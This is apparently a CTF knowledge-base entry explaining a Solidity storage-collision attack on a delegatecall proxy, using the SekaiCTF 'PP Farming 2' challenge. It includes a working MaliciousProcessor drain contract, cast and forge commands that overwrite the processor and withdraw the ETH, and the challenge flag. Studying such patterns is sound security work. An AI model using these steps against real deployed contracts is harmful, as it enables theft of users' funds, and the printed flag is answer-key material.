---
id: web3-delegatecall-storage-collision-proxy
category: WEB
tags: [web3, blockchain, evm, solidity, delegatecall, storage-collision, proxy, transparent-proxy, fallback, selector, unauthenticated-setter, access-control, storage-layout, slot, processor, sekaictf, pp-farming-2, foundry, cast, raw-calldata]
tools: [Web3]
manuals: ["Manuals/Web3/3. Contexto para Claude.md"]
title: "Web3: transparent proxy + delegatecall to a helper with an unauthenticated setter (storage collision → takeover)"
difficulty: hard
created: 2026-10-08
updated: 2026-10-08
related: [web3-reentrancy-checks-effects-interactions, web3-receive-fallback-weak-access-control]
---

## How to recognize this pattern

- A contract with a `fallback()` that `delegatecall`s **to a helper/processor** on (almost) every
  selector, a transparent proxy. If it does NOT refuse unknown selectors, any function of the helper
  is reachable and executes **in the proxy's storage**.
- The helper has a **setter with no access control** (`setX(address)` without `onlyOwner`) and a
  **storage layout aligned** with the proxy's (a deliberately empty `_gap`/slot gives it away).
- Combination = the caller writes to the proxy's storage → overwrites `owner`/`implementation`/
  `processor` → takeover. Each piece is "safe" alone; together they hand over the storage.

## Method

Reference case: SekaiCTF, PP Farming 2 (the "I fixed the reentrancy… I think" one). The ATM delegates
everything (except `processWithdrawal`, selector `0x8260910c`, blocked) to the `processor`.

### 1. Confirm the proxy and the blocked selector

```solidity
fallback() external payable {
    bytes4 sel; assembly { sel := calldataload(0) }
    require(sel != 0x8260910c, "blocked");   // only processWithdrawal is barred
    address proc = processor;                // the rest delegates to the helper
    assembly { calldatacopy(0,0,calldatasize())
        let ok := delegatecall(gas(), proc, 0, calldatasize(), 0, 0) ... }
}
```

### 2. Find the storage collision

```
ATM:     scores (slot0) | processor addr (slot1 b0..19) + locked bool (slot1 b20)
Helper:  _gap   (slot0) | atm       addr (slot1 b0..19) + locked bool (slot1 b20)
```
The `_gap` exists only to align the helper's `atm`/`locked` with the ATM's `processor`/`locked`. Any
`SSTORE` by the helper under `delegatecall` lands in the identical slot of the ATM.

### 3. Find the unauthenticated setter

```solidity
function setATM(address _atm) external { atm = _atm; }   // no check, selector 0x9a2ba7a8
```
Reachable via the ATM's fallback → writes to `slot1` → **overwrites `ATM.processor`**.

### 4. Exploit in 3 txs

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract MaliciousProcessor {
    address payable public immutable player;
    constructor(address payable p) { player = p; }
    function processWithdrawal(address, uint256) external returns (bool) {
        (bool ok,) = player.call{value: address(this).balance}("");  // runs in the ATM's storage
        require(ok); return true;
    }
}
```

```bash
CAST=~/.config/.foundry/bin/cast; FORGE=~/.config/.foundry/bin/forge
RPC="<rpc>"; PK="<pk>"; TARGET="<ATM>"; PLAYER="<your account>"
$FORGE create exploit/MaliciousProcessor.sol:MaliciousProcessor --rpc-url $RPC --private-key $PK --broadcast --constructor-args $PLAYER
MAL=<"Deployed to:">
# (1) seed score>0 to pass withdrawPP's require
$CAST send $TARGET "donatePP(address)" $PLAYER --value 0.01ether --rpc-url $RPC --private-key $PK
# (2) setATM(MAL) via fallback: selector 0x9a2ba7a8 + address padded to 32 bytes -> overwrites processor
$CAST send $TARGET 0x9a2ba7a8000000000000000000000000${MAL:2} --rpc-url $RPC --private-key $PK
# (3) withdrawPP delegates to MaliciousProcessor in the ATM's context -> sends the 10 ETH to player
$CAST send $TARGET "withdrawPP()" --rpc-url $RPC --private-key $PK
$CAST call $TARGET "isSolved()(bool)" --rpc-url $RPC
```

## Gotchas

- **Build raw calldata:** `selector(4 bytes) + arg padded to 32 bytes`. Address = `000000000000000000000000` + 40 hex (no `0x`). `${MAL:2}` strips the `0x`. Alternative: `cast calldata "setATM(address)" $MAL`.
- Confirm the layout with `cast storage <addr> <slot> --rpc-url $RPC` before and after step 2 to watch `processor` change.
- With `delegatecall`, `address(this)` and `balance` are the **proxy's (ATM)**, not the helper's. That's
  why the drain pulls the ETH from the ATM.
- Discover selectors with no source: `cast 4byte <0xsel>` or `heimdall decompile`.

## Related / Cross-reference

- Confirmed source: the SekaiCTF-2026 `blockchain/pp-farming-2/exploit/solve.sh`, which confirms selector
  `0x9a2ba7a8 = setATM(address)`, the fallback delegates everything but `processWithdrawal`, the SSTORE
  lands in slot 1 bytes 0..19 (the `processor` field), the final drain in the ATM's context. Flag
  `SEKAI{pr0xie5_4r3_h4rD_2_3t4k3}`.
- `Arsenal/WEB/web3-reentrancy-checks-effects-interactions.md`: PP Farming 1 (the un-patched version).
- `Manuals/Web3/3. Contexto para Claude.md`: `cast`/`heimdall`, calldata, storage.
